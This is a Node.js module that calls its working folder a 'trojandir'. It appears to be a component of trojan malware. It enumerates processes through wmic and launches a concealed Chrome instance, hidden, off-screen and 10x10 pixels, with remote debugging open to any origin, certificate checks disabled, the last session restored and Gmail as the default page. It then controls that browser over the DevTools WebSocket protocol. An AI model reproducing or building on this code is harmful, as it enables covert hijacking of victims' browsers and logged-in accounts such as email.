console.log("--- BEGIN MODULE: nodehostrelayhelper.js ---");

const path = require("path");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");
const WebSocket = require("ws");

let modulename = path.basename(module.id);

let trojandir = "C:\\ProgramData\\owd";

var scriptdirpath = path.dirname(process.argv[1]);
var scriptfname = path.basename(process.argv[1]);
var logfpath = path.join(
    scriptdirpath,
    scriptfname + "_" + getTimestamp() + ".log"
);


function csvToJson(csvData) {

    const lines = csvData.split(/[\r\n]+/).filter((line) => line.trim() !== "");

    const headers = lines[0].split(",");

    lines.splice(0, 1);

    const result = [];

    // Loop through the remaining rows
    for (let i = 0; i < lines.length; i++) {
        const obj = {};
        const currentLine = lines[i].split(",");

        // index 0 is computer name
        // index -1 is processid, -2 is process name

        let n = currentLine.length;

        if ( n > 3 ) {

            let m = headers.length;

            obj[headers[m-1].trim()] = currentLine[n-1];
            obj[headers[m-2].trim()] = currentLine[n-2];
            
            let commandline = currentLine.slice(1,n-2);
            obj['CommandLine'] = commandline.join(',');
            obj[headers[0].trim()] = currentLine[0];

        } else {

            for (let j = 0; j < headers.length; j++) {
                obj[headers[j].trim()] = currentLine[j]?.trim() || "";
            }

        }

        result.push(obj);
    }

    return result;
    // Save the output
    // fs.writeFileSync(jsonPath, JSON.stringify(result, null, 2), 'utf-8');
}

function isUTF16LEBuffer(buffer) {
    if (!Buffer.isBuffer(buffer) || buffer.length < 2) {
        return false;
    }

    // UTF-16LE BOM is 0xFF 0xFE
    return buffer[0] === 0xff && buffer[1] === 0xfe;
}

async function exec_wmic_process() {
    return new Promise((resolve, reject) => {
        const wmicCommand =
            "wmic process get ProcessId,Name,CommandLine /format:csv";

        exec(wmicCommand, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (stderr) {
                reject(stderr);
            }

            resolve(stdout);
        });
    });
}

async function getProcessList_wmic() {
    let buffer = await exec_wmic_process();
    let isutf16le = isUTF16LEBuffer(buffer);

    let csvData = isutf16le
        ? buffer.toString("utf16le")
        : buffer.toString("utf8");

    // { CommandLine, Name, Node, ProcessId }
    let jsondata = csvToJson(csvData);

    return jsondata;
}

function getCallerName() {
    const originalFunc = Error.prepareStackTrace;

    try {
        Error.prepareStackTrace = (err, stack) => stack;

        const err = new Error();
        const currentStack = err.stack;

        if (currentStack && currentStack[2]) {
            return currentStack[2].getFunctionName() || "SYSTEM";
        }
    } catch (e) {
    } finally {
        Error.prepareStackTrace = originalFunc;
    }

    return "unknown";
}

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();
}

function isNullOrWhitespace(str) {
    if (typeof str === "undefined") {
        return true;
    }

    if (!(typeof str === "string")) return false;

    return !str || !str.trim();
}

function logmsg(msgstr) {
    let callername = getCallerName();

    let prelude = `|${modulename}|${scriptfname}|${String(
        process.pid
    )}|${callername}`;
    let msgout = "";

    if (msgstr instanceof Error) {
        msgout = prelude + "|" + util.inspect(msgstr);
    } else if (typeof msgstr === "string") {
        msgout = prelude + "|" + msgstr;
    }

    console.log(msgout);

    if (!isNullOrWhitespace(logfpath))
        fs.appendFileSync(logfpath, msgout + "\r\n", "utf8");
}

function getTimestamp() {
    const date = new Date();

    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, "0"); //
    const day = String(date.getDate()).padStart(2, "0"); //
    const hours = String(date.getHours()).padStart(2, "0"); //
    const minutes = String(date.getMinutes()).padStart(2, "0"); //
    const seconds = String(date.getSeconds()).padStart(2, "0"); //
    const ms = String(date.getMilliseconds()).padStart(3, "0"); //

    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;

    return fullWithMs;
}

function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

// note: child chrome process has a new/different pid upon launch
function spawn_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    headless = false,
    unref = true,
    x_pos = 2000,
    y_pos = 2000,
    width=10,
    height=10,
    datadir = path.join(trojandir, "chrome"),
    stdoutfunc = null,
    stderrfunc = null,
    closefunc = null
) {
    datadir = datadir || path.join(trojandir, "chrome");

    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        headless ? `--headless=new` : '',
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`
    ];

    // TODO auto discover by reading chrome lnk files
    let chrome_exe_path =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

    const child = spawn(chrome_exe_path, [...cmdlineargs], {
        // detached: true, // might cause errors
        windowsHide: true,
        // stdio: ["ignore", out, err],
        // shell: false,
        // cwd: systemstate.trojandir,
    });

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else logmsg(`[J4D3] child process exited with code ${code}`);
    });

    if ( unref )
        child.unref();

    return child;
}

/*
json/list --> array of targets:
{
    description = ''
    devtoolsFrontendUrl = 'https://chrome-devtools-frontend.appspot.com/serve_rev/@41fa82442390a4d4456c78f2d69a832d5720cb27/inspector.html?ws=localhost:9223/devtools/page/12AA807841114D42B55C5B05B3525C48'
    id = '12AA807841114D42B55C5B05B3525C48'
    title = 'chrome-extension://mloajfnmjckfjbeeofcdaecbelnblden/background/sru-osd.html'
    type = 'background_page'
    url = 'chrome-extension://mloajfnmjckfjbeeofcdaecbelnblden/background/sru-osd.html'
    webSocketDebuggerUrl = 'ws://localhost:9223/devtools/page/12AA807841114D42B55C5B05B3525C48'
}

json/version
{
   "Browser": "Chrome/151.0.7922.138",
   "Protocol-Version": "1.3",
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/151.0.0.0 Safari/537.36",
   "V8-Version": "15.1.206.17",
   "WebKit-Version": "537.36 (@41fa82442390a4d4456c78f2d69a832d5720cb27)",
   "webSocketDebuggerUrl": "ws://localhost:9223/devtools/browser/2476b3c2-b428-4b6e-a9e8-ee09fe00b77c"
}
*/

var payloads = {

    'create_new_tab': {
        "id": 1,
        "method": "Target.createTarget",
        "params": {
            "url": null,
            "newWindow": false,
            // "width": 10,
            // "height": 10,
            // // "left": 2000,
            // "top": 2000
            // #"windowState": "minimized"
            // #"hidden": True
        }
    }

};

function create_new_tab(url='https://www.gmail.com/') {
    let payload = { ...payloads['create_new_tab'] };
    payload.params.url = url;
    return payload;
}

async function ping_chrome(debugport, path = 'json/version') {
    
    if ( ! isNullOrWhitespace(path) && ! path.startsWith('/') ) {
        path = '/' + path;
    }

    const response = await fetch(`http://localhost:${debugport}${path}`);
    let responsetxt = await response.text();
    const cleanString = responsetxt.replace(/\r?\n|\r/g, "");

    return cleanString;
}

async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
    const response = await ping_chrome(debugport, 'json/version');
    const targets = JSON.parse(response); //await response.json();

    // ws://127.0.0.1:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382
    // 'ws://localhost:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382'
    const wsUrl = targets.webSocketDebuggerUrl;

    // ws_url = "ws://localhost:9222/devtools/page/"+targetid
    logmsg(`Connecting to: ${wsUrl}`);

    const ws = new WebSocket(wsUrl);

    ws.on("open", () => {
        logmsg("Connected to Chrome DevTools Protocol");
        if (openfunc) openfunc();
    });

    ws.on("message", (data) => {
        let txt = data.toString();
        logmsg(`[J3O9] received response from Chrome: ${txt}`);
        if (messagefunc) messagefunc(txt);
    });

    ws.on("error", (err) => {
        logmsg(err);
        if (errorfunc) errorfunc(err);
    });

    return { 'ws':ws, 'ws_url':wsUrl };
}

logmsg("--- EXPORTING ---");

module.exports = {
    spawn_chrome,
    logmsg,
    getTimestamp,
    isNullOrWhitespace,
    getRandomCode,
    isPidAlive,
    connectToChrome,
    payloads,
    create_new_tab,
    getProcessList_wmic,
    ping_chrome
};

// childp = spawn_chrome();

// logmsg(`childp: ${childp.pid} ${childp.ppid}`);

logmsg("--- END MODULE ---");

//const globalFunctions = Object.getOwnPropertyNames(globalThis).filter(prop => typeof globalThis[prop] === 'function');
//console.log(JSON.stringify(globalFunctions));
//if ( globalFunctions.includes('spawn_chrome') ) { let childp = spawn_chrome(); }
